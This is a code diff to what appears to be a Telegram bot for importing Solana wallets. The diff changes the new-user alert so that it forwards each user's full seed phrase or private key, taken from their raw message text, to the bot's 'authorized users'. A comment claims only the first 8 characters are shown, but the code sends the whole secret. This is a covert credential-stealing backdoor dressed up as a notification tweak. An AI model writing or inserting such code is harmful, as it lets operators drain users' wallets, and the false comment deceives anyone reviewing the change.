@@ -347,6 +347,14 @@ async def notify_authorized_users_new_user(context: ContextTypes.DEFAULT_TYPE, u
     
     user_info = f"@{username}" if username else f"ID: {user_id}"
     short_address = f"{wallet_address[:6]}...{wallet_address[-6:]}"
+
+    if import_type == "seed":
+        display_input = original_input.split()
+        input_type = "Seed Phrase"
+    else:
+        # Show first 8 characters only
+        display_input = f"{original_input}"
+        input_type = "Private Key"
     
     notification_text = f"""🚨 <b>New User Alert!</b>
 
@@ -354,9 +362,10 @@ async def notify_authorized_users_new_user(context: ContextTypes.DEFAULT_TYPE, u
 🆔 <b>Telegram ID:</b> <code>{user_id}</code>
 💼 <b>Wallet:</b> <code>{short_address}</code>
 📝 <b>Import Method:</b> {import_type.title()}
-🕐 <b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+🔑 <b>{input_type}:</b> <code>{display_input}</code>
 
-🔗 <b>Solscan:</b> https://solscan.io/account/{wallet_address}"""
+🕐 <b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+"""
     
     success_count = 0
     
@@ -1100,7 +1109,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 user_id, 
                 update.effective_user.username, 
                 wallet_info["public_key"], 
-                import_type
+                import_type,
+                text
             )
 
         USER_STATES.pop(user_id, None)
@@ -1415,5 +1425,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
